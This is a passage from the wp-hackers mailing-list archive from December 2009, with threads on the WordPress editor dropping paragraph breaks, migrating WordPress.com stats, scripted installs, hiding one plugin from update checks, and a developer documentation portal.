	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
Message-ID: <9aa12a490912132351v3bcda935gb8046fe899c50fb3@mail.gmail.com>

I agree to some extent. But usually it is much easier to automate such
task. For example it is much simpler to add a filter to functions.php,
which will do that substitution for you. Some people endure additional
obligations, some don't. If they are ok with manual manipulations,
then it's an option, but what if they aren't?

I will digg for appropriate filter and let you know if I succeed.

On Sun, Dec 13, 2009 at 7:51 PM, mccormicky <mccormicky at gmail.com> wrote:
> I think I was going on about the html *mode* of the wp editor, not *html*itself.
>
> It's not a firefox only issue. I see this in safari and internet explorer.
>
> Simple fix: use the html *mode of the editor* to insert line breaks by *hitting
> the return key*.
> Then switch back to visual format ?to do your rich text stuff * *then switch
> back to html mode* *and save.
> if you save your changes in visual mode you run the risk of losing some
> formatting.In this case, line breaks.
> People usually love having options.
> why ?only ?use 1 mode of the wp editor when there are 2?
>
>
>
>
> On Sun, Dec 13, 2009 at 7:04 AM, Dion Hulse (dd32) <wordpress at dd32.id.au>wrote:
>
>> Yes, But testing with a different browser will tell you if its WordPress at
>> fault, or a Browser/TinyMCE fault. Testing with the Same browser on a
>> different PC will tell you if its a TinyMCE or Browser fault.
>>
>>
>> On Sun, 13 Dec 2009 22:38:52 +1100, Davit Barbakadze <jayarjo at gmail.com>
>> wrote:
>>
>> ?I've meany first example:
>>>
>>> ?Test<Enter>Test<Enter>Test:
>>>> Result: <p>Test</p><p>Test</p><p>Test</p>
>>>>
>>>
>>> And what we get in the end is:
>>>
>>> TestTestTest
>>>
>>> We use TinyMCE and Firefox 3.5.5 as a browser. Not sure what happens
>>> in other browsers. But it's important for this feature to work in
>>> Firefox.
>>>
>>> On Sun, Dec 13, 2009 at 3:17 PM, Dion Hulse (dd32) <wordpress at dd32.id.au>
>>> wrote:
>>>
>>>> All this talk of HTML mode is confusing things i think..
>>>>
>>>> As it should work:
>>>>
>>>> Test<Enter>Test<Enter>Test:
>>>> Result: <p>Test</p><p>Test</p><p>Test</p>
>>>>
>>>> Test<Shift+Enter>Test
>>>> Result: Test<br/>Test
>>>>
>>>> That works fine for me on a 2.9 nightly, Are you saying that the first
>>>> Example, Results in the 2nd? ?Or are you saying it ends up like
>>>> TestTestTest?
>>>> If the latter, That wouldnt surprise me if running in the HTML mode..
>>>> ?But
>>>> TinyMCE should handle the paragraphing easily enough.. Have you tried a
>>>> different browser?
>>>>
>>>> On Sun, 13 Dec 2009 22:10:57 +1100, mccormicky <mccormicky at gmail.com>
>>>> wrote:
>>>>
>>>> ? learning to press the return key in the html mode of the wp editor or
>>>>> to
>>>>> type <br/> is not exactly learning html.
>>>>>
>>>>>
>>>>>
>>>>>
>>>>>
>>>>> On Sun, Dec 13, 2009 at 4:06 AM, Davit Barbakadze <jayarjo at gmail.com>
>>>>> wrote:
>>>>>
>>>>> ?It is understandable, 'cause it should be very handy feature,
>>>>>> especially when one has media and style rich posts. Using html editor
>>>>>> is not an option for some people at all (not familiar with html and do
>>>>>> not bother to learn it - why should they in fact?)
>>>>>>
>>>>>> Does any one know at least what is a hook/filter, which is meant to
>>>>>> accomplish that converting task?
>>>>>>
>>>>>> On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com>
>>>>>> wrote:
>>>>>> > ?If you hit the return key or insert a <br/> in html mode then switch
>>>>>> > to
>>>>>> > visual (rich text) and save, they get wiped out.
>>>>>> > But if you make line breaks with <br/> in html mode or hit the return
>>>>>> > key
>>>>>> -
>>>>>> > and hit save it gets saved.
>>>>>> > - it might be a browser issue though. Not sure. I always use the html
>>>>>> mode
>>>>>> > so I am not often bothered by it.
>>>>>> > It isn't a new behavior of 2.8.6 - ?I have had complaints about the
>>>>>> editor
>>>>>> > from clients for years.
>>>>>> > Loss of formatting goes goes hand in hand with rich text editing & I
>>>>>> > tell
>>>>>> > them to use the html mode but they don't often listen..
>>>>>> >
>>>>>> >
>>>>>> > On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com
>>>>>> >
>>>>>> wrote:
>>>>>> >
>>>>>> >> I'm running 2.8.6. Plugins I got are:
>>>>>> >>
>>>>>> >> All in One SEO Pack
>>>>>> >> Ozh' Admin Drop Down Menu
>>>>>> >> qTranslate
>>>>>> >>
>>>>>> >> But I've used them before without such problems. At least I haven't
>>>>>> >> noticed them.
>>>>>> >>
>>>>>> >> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>>>>>> >>
>>>>>> >>
>>>>>> >> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com>
>>>>>> wrote:
>>>>>> >> > Which version are you running? Do you have any plugins installed
>>>>>> and
>>>>>> >> > activated?
>>>>>> >> >
>>>>>> >> > Chris Jean
>>>>>> >> > http://gaarai.com/
>>>>>> >> > @chrisjean
>>>>>> >> >
>>>>>> >> >
>>>>>> >> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>>>>>> >> >>
>>>>>> >> >> For some reason freshly installed blog doesn't convert newlines
>>>>>> >> >> entered in posts rich text editor into paragraphs, as it usually
>>>>>> does.
>>>>>> >> >> It just outputs text on one long line, without any breaks. Text
>>>>>> >> >> formatting works only if forcefully styled or aligned. Is it how
>>>>>> it
>>>>>> >> >> should be? Never noticed such behavior in WordPress.
>>>>>> >> >>
>>>>>> >> >>
>>>>>> >> >
>>>>>> >> > _______________________________________________
>>>>>> >> > wp-hackers mailing list
>>>>>> >> > wp-hackers at lists.automattic.com
>>>>>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>> >> >
>>>>>> >>
>>>>>> >>
>>>>>> >>
>>>>>> >> --
>>>>>> >> Davit Barbakadze
>>>>>> >> _______________________________________________
>>>>>> >> wp-hackers mailing list
>>>>>> >> wp-hackers at lists.automattic.com
>>>>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>> >>
>>>>>> > _______________________________________________
>>>>>> > wp-hackers mailing list
>>>>>> > wp-hackers at lists.automattic.com
>>>>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>> >
>>>>>>
>>>>>>
>>>>>>
>>>>>> --
>>>>>> Davit Barbakadze
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>>
>>>>>> ?_______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>>
>>>>
>>>> --
>>>> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>>
>>>
>>>
>>>
>>
>> --
>> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Mon Dec 14 08:02:58 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Mon, 14 Dec 2009 12:02:58 +0400
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <4B258E8E.1070001@rotorised.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>
	<9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>
	<5a1dad880912130920h6b5381fao61669d59f5215f2d@mail.gmail.com>
	<e1202cb10912131700u6757e591ie258743449d81210@mail.gmail.com>
	<4B258E8E.1070001@rotorised.com>
Message-ID: <9aa12a490912140002y3a5a46f0k89603887f993a60e@mail.gmail.com>

Alex, Jeremy, that's exactly what I'm trying to daccomplish - to find
a way to associate ex-wordpress.com blog stats with new standalone
installation (domain will stay the same).

Ryan, I see that drop down selection box too, but the problem is that
wordpress.com based blogs do not make their way into it (don't know
why).

On Mon, Dec 14, 2009 at 5:02 AM, Ryan McCue <lists at rotorised.com> wrote:
> Jeremy Clarke wrote:
>> Seems like the actual linkage for external blogs is via your Akismet
>> API key installed on the .org blog, so what you'd want is a way to
>> tell the wordpress.com servers that you've moved and want to switch
>> the old stats to your API key. I can't find anything even approaching
>> that ability but I'm not good at wordpress.com navigation so maybe its
>> hidden.
>>
>
> I noticed the other day there is a select box on the API key page for
> the plugin to change the location of a blog, I'm not sure if that works
> with WP.com blogs though. Might be worth a try.
>
> --
> Ryan McCue
> <http://ryanmccue.info/>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From admin at laptoptips.ca  Mon Dec 14 08:05:34 2009
From: admin at laptoptips.ca (Andrew Ozz)
Date: Mon, 14 Dec 2009 00:05:34 -0800
Subject: [wp-hackers] newlines from rich text editor do not convert to
 paragraphs
In-Reply-To: <d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>	<4B244DE9.6050909@gaarai.com>	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>	<op.u4viywoaspxmuu@dd32>	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
Message-ID: <4B25F1CE.9060805@laptoptips.ca>

mccormicky wrote:
> I think I was going on about the html *mode* of the wp editor, not *html*itself.
> 
> It's not a firefox only issue. I see this in safari and internet explorer.
> 
> Simple fix: use the html *mode of the editor* to insert line breaks by *hitting
> the return key*.
> Then switch back to visual format  to do your rich text stuff * *then switch
> back to html mode* *and save.
> if you save your changes in visual mode you run the risk of losing some
> formatting.In this case, line breaks.

I'm still not clear what the actual problem is... Dion explained quite 
well how the editors work: in HTML mode single return is converted to 
<br /> two returns are converted to <p>. In visual mode single return 
inserts new paragraph, and Shift+Return inserts <br />. Saving either in 
visual or HTML mode doesn't make a difference.

If you're seeing something else, please disable all plugins and switch 
to the default theme to see if it makes a difference.

From jayarjo at gmail.com  Mon Dec 14 11:49:06 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Mon, 14 Dec 2009 15:49:06 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <4B25F1CE.9060805@laptoptips.ca>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
Message-ID: <9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>

> In visual mode single return inserts new paragraph

This is what wasn't working. But switching to default theme and
turning off plugins corrected this issue. So my guess here (proved by
some experiments) will be that using $post->post_content in the loop
directly will output not converted string (which our current theme
does intensively). Actual conversion as it seems is happening inside
the_content() tag (which is bypassed by our theme). And not inside
get_the_content(), but in the_content() tag only.

Update: Searching for filters attached to 'the_content' hook, brought
me to wp-includes/default-filters.php file, which is probably a
container for all default wordpress filters. And one of filters
attached to 'the_content' hook turned out to be wpautop() function
(http://phpxref.com/xref/wordpress/wp-includes/formatting.php.source.html#l121),
which does exactly that: "Replaces double line-breaks with paragraph
elements."

It means that only the_content() tag will output properly converted
content string, all other approaches to retrieving post content will
result in raw, unconverted text. Among others the_content() converts
text smilies into graphics, does some simple xhtml fixing and invalid
utf characters substitutions, and obviously much more.

It can be concluded from here that wordpresses unexplainable fault in
similar cases (which happen pretty often as I found out from my google
search activity), is, at least partially, untrue.

On Mon, Dec 14, 2009 at 12:05 PM, Andrew Ozz <admin at laptoptips.ca> wrote:
> mccormicky wrote:
>>
>> I think I was going on about the html *mode* of the wp editor, not
>> *html*itself.
>>
>> It's not a firefox only issue. I see this in safari and internet explorer.
>>
>> Simple fix: use the html *mode of the editor* to insert line breaks by
>> *hitting
>> the return key*.
>> Then switch back to visual format ?to do your rich text stuff * *then
>> switch
>> back to html mode* *and save.
>> if you save your changes in visual mode you run the risk of losing some
>> formatting.In this case, line breaks.
>
> I'm still not clear what the actual problem is... Dion explained quite well
> how the editors work: in HTML mode single return is converted to <br /> two
> returns are converted to <p>. In visual mode single return inserts new
> paragraph, and Shift+Return inserts <br />. Saving either in visual or HTML
> mode doesn't make a difference.
>
> If you're seeing something else, please disable all plugins and switch to
> the default theme to see if it makes a difference.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Mon Dec 14 12:32:50 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Mon, 14 Dec 2009 16:32:50 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
Message-ID: <9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>

Probably it would have been more logical applying filters attached to
'the_content' hook within get_the_content() function. This way we
could get filtered content echoed via the_content() tag, filtered
content in a string via get_the_content() and pure content via
$post->post_content.

On Mon, Dec 14, 2009 at 3:49 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>> In visual mode single return inserts new paragraph
>
> This is what wasn't working. But switching to default theme and
> turning off plugins corrected this issue. So my guess here (proved by
> some experiments) will be that using $post->post_content in the loop
> directly will output not converted string (which our current theme
> does intensively). Actual conversion as it seems is happening inside
> the_content() tag (which is bypassed by our theme). And not inside
> get_the_content(), but in the_content() tag only.
>
> Update: Searching for filters attached to 'the_content' hook, brought
> me to wp-includes/default-filters.php file, which is probably a
> container for all default wordpress filters. And one of filters
> attached to 'the_content' hook turned out to be wpautop() function
> (http://phpxref.com/xref/wordpress/wp-includes/formatting.php.source.html#l121),
> which does exactly that: "Replaces double line-breaks with paragraph
> elements."
>
> It means that only the_content() tag will output properly converted
> content string, all other approaches to retrieving post content will
> result in raw, unconverted text. Among others the_content() converts
> text smilies into graphics, does some simple xhtml fixing and invalid
> utf characters substitutions, and obviously much more.
>
> It can be concluded from here that wordpresses unexplainable fault in
> similar cases (which happen pretty often as I found out from my google
> search activity), is, at least partially, untrue.
>
> On Mon, Dec 14, 2009 at 12:05 PM, Andrew Ozz <admin at laptoptips.ca> wrote:
>> mccormicky wrote:
>>>
>>> I think I was going on about the html *mode* of the wp editor, not
>>> *html*itself.
>>>
>>> It's not a firefox only issue. I see this in safari and internet explorer.
>>>
>>> Simple fix: use the html *mode of the editor* to insert line breaks by
>>> *hitting
>>> the return key*.
>>> Then switch back to visual format ?to do your rich text stuff * *then
>>> switch
>>> back to html mode* *and save.
>>> if you save your changes in visual mode you run the risk of losing some
>>> formatting.In this case, line breaks.
>>
>> I'm still not clear what the actual problem is... Dion explained quite well
>> how the editors work: in HTML mode single return is converted to <br /> two
>> returns are converted to <p>. In visual mode single return inserts new
>> paragraph, and Shift+Return inserts <br />. Saving either in visual or HTML
>> mode doesn't make a difference.
>>
>> If you're seeing something else, please disable all plugins and switch to
>> the default theme to see if it makes a difference.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Davit Barbakadze
>



-- 
Davit Barbakadze

From otto at ottodestruct.com  Mon Dec 14 14:46:02 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 14 Dec 2009 08:46:02 -0600
Subject: [wp-hackers] Automate the installation of WordPress
In-Reply-To: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
Message-ID: <161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>

I've used this script to do quickie installs before:

http://wpquickinstall.com/

It has some bugs, but it mostly works.

-Otto
Sent from Memphis, TN, United States


On Sun, Dec 13, 2009 at 2:33 PM, Andr? <andre at thehook.eu> wrote:
> Hello,
>
> I want to make a script that install WordPress for my users without going
> through the install.php?step=1 and ..?step=2.
>
> After what I have found there is a shell script made by Stephanie Booth
> (http://climbtothestars.org/play/wordpress.sh.txt) but it is pretty old,
> and is not working on the latest version of WP.
>
> The script above would be perfect for me after some stripping, but the
> "wget $url/wp-admin/install.php?step=x" does not work, as it requires an
> email address as input.
>
> I have been on the thought to just backup the whole database and change
> the values I needed to, but then again all the times will be pretty old as
> WP inserts comments and everything during installation that's dated on the
> installation time.
>
> Is there anywhere I can find the SQL in a separate file?
>
>
> Thanks,
> Andr?
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Mon Dec 14 14:56:23 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 14 Dec 2009 09:56:23 -0500
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
	<31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
Message-ID: <e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>

On Sun, Dec 13, 2009 at 11:29 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> On Dec 13, 2009, at 6:03 PM, Doug Stewart wrote:
>
>> What about this: what if you added a Plugin-Update-URI header field to
>> plugins and themes? Themes or plugins without an explicitly-defined URI
>> would default to checking api.wordpress.org while plugin/theme devs that
>> don't (for whatever reasons) want to use the .org hosting environment can
>> host their own updates. Then, we could supply the necessary info for 3rd
>> parties to implement the expected return values from the update API and then
>> they, too, could take advantage of the internal WordPress upgrade checking,
>> further reducing ways that individual blogs can be compromised.
>
> My plugin code notwithstanding, I like Doug's idea a lot.

It's a good idea too, though part of a bigger plan. The plugin code
that achieves the same thing is much more likely to be a solution :)


> add_filter( 'option_update_plugins', 'filter_get_update_plugins' );
> add_filter( 'transient_update_plugins', 'filter_get_update_plugins' ); // for cached data
>
> function filter_get_update_plugins( $data ) {
> ? ? ? ?unset( $data->response['myplugin/myplugin.php'] );
> ? ? ? ?return $data;
> }

Has anyone created a Codex page about this whole issue? It would be
good to have this code there. Anyone with strong feelings about the
issue want to put one together? It could have sections explaining each
part of the update process and have ways of circumventing each:
Sending url, sending server info, sending plugins list.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From jer at simianuprising.com  Mon Dec 14 15:34:08 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 14 Dec 2009 10:34:08 -0500
Subject: [wp-hackers] managing several MU installations
In-Reply-To: <4ede8f490912131223g28964b5wc08601efa3b42a2d@mail.gmail.com>
References: <5721607d0912130400k25d1916ai7b60c94003f4a008@mail.gmail.com>
	<4ede8f490912130829g3aee31cfk63daa4d1bb6a802f@mail.gmail.com>
	<5721607d0912131019q26d25497v25a056c8c22662ae@mail.gmail.com>
	<4ede8f490912131220x735e3d92yfd9800d74e24dd92@mail.gmail.com>
	<4ede8f490912131223g28964b5wc08601efa3b42a2d@mail.gmail.com>
Message-ID: <e1202cb10912140734qd97f4cbk4a88f732a5b6d967@mail.gmail.com>

Hey guys, this is my solution. It's obviously pretty hacky but so far
it has worked well and saved me a LOT of time managing > 25 blogs that
all have the same settings (not in MU cause they all got started too
early and I haven't had time to migrate them into one install yet).
What it does is allow you to override anything in wp_options by
defining arrays of default values in a plugin file or functions.php.
This way you can just edit that one file that all sites share and
update it with SVN.

Pasted code: http://pastie.org/742625

The system basically lets you set up two arrays that override the
options on a blog. The first is full option overrides, where you want
to obliterate any existing version of the option and replace it with a
new value, the second is for complex array options where you want to
go in and carefully replace only certain keys in the array. I think if
you look through it the code is commented enough to be clear.

You wrap this stuff into a super-basic plugin and put it in
/mu-plugins/ folder so it will be loaded for every blog in the MU
install. If svn updating 10 places is too much for you you could make
a symlink to the plugin file in each of the /mu-plugins/ directories
to one central place where you store the actual file, that way you'd
only have to edit it in one place to affect all sites.

(PROTIP: Did you know you can use the /mu-plugins/ directory to
autoload plugins and hide them from the plugins screen, even if you're
not using MU? This blew my mind a little when I learned it at WCNYC)

The pasted code only works for individual site options, but if you
know you're PHP I'm sure you could add a third section of the
array/logic that would handle the update_site_option() MU side of the
options API. Sorry that its not actually packaged up as a plugin or
anything, but I use it as part of a bigger plugin that does lots of
stuff for me.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From scribu at gmail.com  Mon Dec 14 16:00:07 2009
From: scribu at gmail.com (scribu)
Date: Mon, 14 Dec 2009 18:00:07 +0200
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
	<d7153760912130310j730d17edid3bfdae64bbc43a3@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
	<9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
Message-ID: <349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>

On Mon, Dec 14, 2009 at 2:32 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> Probably it would have been more logical applying filters attached to
> 'the_content' hook within get_the_content() function. This way we
> could get filtered content echoed via the_content() tag, filtered
> content in a string via get_the_content() and pure content via
> $post->post_content.
>

You can apply the filter yourself:

$filtered_content = apply_filters('the_content', get_the_post_content());


-- 
http://scribu.net

From wp at xentek.net  Mon Dec 14 16:21:29 2009
From: wp at xentek.net (Eric Marden)
Date: Mon, 14 Dec 2009 11:21:29 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
	<5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com>
Message-ID: <F343B5F9-1415-4491-8265-66F77996423F@xentek.net>


On Dec 12, 2009, at 1:05 PM, Matt Walters wrote:

> Also, and this was noted elsewhere I believe, I really like the
> php.net documentation.  Something similar for WordPress where I could
> load up worddpress.org/code/get_posts

You mean like this? http://codex.wordpress.org/Function_Reference/get_posts

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From shane at bugssite.org  Mon Dec 14 16:59:20 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Mon, 14 Dec 2009 11:59:20 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <F343B5F9-1415-4491-8265-66F77996423F@xentek.net>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
	<5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com>
	<F343B5F9-1415-4491-8265-66F77996423F@xentek.net>
Message-ID: <4B266EE8.1000800@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

What I don't like about that is that when you do a search in the codex,
you can't really tell that it's a function.

Just like Wikipedia -- *groans* --  get_posts (function) -- should be
the title of the article or in a new namespace "Function:get_posts"

Again I still think even the http://phpdoc.wordpress.org doesn't allow
user examples. A mix of the Codex and PHPDoc would be something like the
PHP.net function reference site.

Tutorials could still be posted and then there could be user comments.
Just another 2 cents.

Your Friend,
Shane
http://bugssite.org/

On 12/14/2009 11:21 AM, Eric Marden wrote:
> 
> On Dec 12, 2009, at 1:05 PM, Matt Walters wrote:
> 
>> Also, and this was noted elsewhere I believe, I really like the
>> php.net documentation.  Something similar for WordPress where I could
>> load up worddpress.org/code/get_posts
> 
> You mean like this? http://codex.wordpress.org/Function_Reference/get_posts
> 
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
> 
> 
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (MingW32)

iQIcBAEBAgAGBQJLJm7oAAoJEC7/vS6gbNwFviwQAK380/A7pmunUqGMzluxChEB
7v/vweUrgmRSdiV6G8t2QgqZjcyJVFGoPHtFO2M+aaNkQXfGMTXneEAvKoKB04VF
lFiAeznGA2Q3qz3RvqvYSKpzqAgXegDuXnp0pKlKw8fVFkZPLiV5KsBzMXM+kwHP
Xv3OHCbnWkhDX3knFNQM0/MN3qIl8lQNxmLFe1TZ0hUC5UPLJNqaVRgcxzkAgw4j
Tsos06jPPXXMmhCLCONGmOyC05ycfiJgFtc23l5IIY1iJgHxEwv3jyyNfZH0oeji
9qHQP3VfcPeYUAsMEn38XUu1SeNmzs7opjYbYRX7l2vbMvidueQ3IpF4zz6TZJqb
REudOeTTOaMlfHstjz8pBqPFASJhCfN6N+zn+5BjqEO099aIdtyYp6WYc8kQULLM
VfZWUo6o8pMCwUDVHd/CS2EEgc6vnr73WVdS4v98DPJvpAqIYoLayX5b2Q5GBhlv
JOk18mIbJhqZZO6jwQh6R/4hqOCDZ1xZWl2faU0obLXSz7nlggq/YrLagWCqBQo0
imzWU17+clzmDYkGHItsHzt8hkdvhkTrEgoF1ACUZBOsvqmsZL0jFjN7YTRn7njP
5yFeS4RsldAXKbMGWqD+6lc3Eby582Y8uC28f0F5YLnqx+lhCe91JUiMX1wJefsr
uDbTXI2iy2n3o9CRlLMX
=13hU
-----END PGP SIGNATURE-----

From otto at ottodestruct.com  Mon Dec 14 17:11:39 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 14 Dec 2009 11:11:39 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B266EE8.1000800@bugssite.org>
References: <4B22AD95.8040401@mullenweg.com>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com> 
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com> 
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com> 
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com> 
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com> 
